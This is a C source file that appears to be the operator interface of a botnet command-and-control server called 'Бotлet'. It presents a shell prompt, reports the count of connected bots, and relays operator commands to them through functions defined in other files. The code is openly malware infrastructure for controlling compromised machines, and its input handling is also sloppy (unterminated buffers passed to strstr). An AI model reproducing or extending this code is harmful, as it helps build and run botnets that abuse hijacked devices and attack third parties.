#include "../../includes/server/interface.h"
#include "../io/handler.c"
#include "../io/io.c"
#include "data.c"
#pragma once


/*
    *    util/server/interface.c
    *    Date: 11/09/21
    *    Author: 0x1CA3
*/


unsigned int DEVICE_COUNT = 0;

void *interface(void *fd_user) {
    int user_fd = *(int *)fd_user;
    char buffer[1024];
    char cmd_line[64];
    sprintf(cmd_line, "\n%s@Бotлet~# ", USERNAME);
    while (1) {
        send(user_fd, cmd_line, strlen(cmd_line), 0);
        read(user_fd, buffer, sizeof(buffer));
        if (strstr(buffer, "exit") || strstr(buffer, "quit") != NULL) {
            break;
        } else if (strstr(buffer, "bots") || strstr(buffer, "list") != NULL) {
            char *botcount = "\nBots -> ";
            char display_bots[64];
            sprintf(display_bots, "%d\n", DEVICE_COUNT);
            send(user_fd, botcount, strlen(botcount), 0);
            send(user_fd, display_bots, strlen(display_bots), 0);
        } else if (strstr(buffer, "command") != NULL) {
            send_command(user_fd);
        } else {
            handler(buffer, user_fd);
        }
    }
    return NULL;
}